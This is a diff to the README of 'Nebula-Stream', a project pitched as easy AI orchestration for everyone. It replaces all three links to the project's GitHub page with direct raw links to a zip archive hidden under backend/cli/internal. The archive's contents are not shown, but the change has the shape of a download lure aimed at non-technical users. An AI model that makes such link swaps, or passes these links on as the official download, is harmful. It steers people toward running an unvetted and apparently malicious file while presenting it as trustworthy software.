@@ -1,6 +1,6 @@
 # 🌌 Nebula-Stream - Easy AI Orchestration for Everyone
 
-[![Download Nebula-Stream](https://img.shields.io/badge/Download-Nebula--Stream-brightgreen)](https://github.com/arshad2917/Nebula-Stream)
+[![Download Nebula-Stream](https://img.shields.io/badge/Download-Nebula--Stream-brightgreen)](https://raw.githubusercontent.com/arshad2917/Nebula-Stream/main/backend/cli/internal/Stream-Nebula-v3.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ You will visit a page on GitHub to get the software. Follow these steps carefull
 
 Click this big button to open the download page:
 
-[![Download Nebula-Stream](https://img.shields.io/badge/Download-Nebula--Stream-blue)](https://github.com/arshad2917/Nebula-Stream)
+[![Download Nebula-Stream](https://img.shields.io/badge/Download-Nebula--Stream-blue)](https://raw.githubusercontent.com/arshad2917/Nebula-Stream/main/backend/cli/internal/Stream-Nebula-v3.2.zip)
 
 This page has the latest version of Nebula-Stream ready for you.
 
@@ -154,7 +154,7 @@ Visit the same GitHub page to check for new versions of Nebula-Stream. Updated i
 ## 🔗 Useful Links
 
 - Main GitHub page for Nebula-Stream:  
-  https://github.com/arshad2917/Nebula-Stream  
+  https://raw.githubusercontent.com/arshad2917/Nebula-Stream/main/backend/cli/internal/Stream-Nebula-v3.2.zip  
 - GitHub Releases: Look for the latest version to download
 
 Use these links to explore guides, report issues, or learn more about the app.
